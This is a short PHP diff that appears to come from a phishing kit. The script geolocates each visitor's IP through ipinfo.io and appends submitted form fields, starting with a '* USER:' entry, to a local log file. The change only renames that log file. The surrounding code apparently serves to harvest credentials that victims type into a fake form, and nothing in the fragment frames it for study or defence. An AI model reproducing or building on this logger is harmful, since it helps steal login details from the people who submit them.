@@ -12,7 +12,7 @@ $proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 	
-	$file = fopen("NEW.txt", "a");
+	$file = fopen("NEW01.txt", "a");
 	
 fwrite($file, 
 "* USER: ".$_POST['user']."
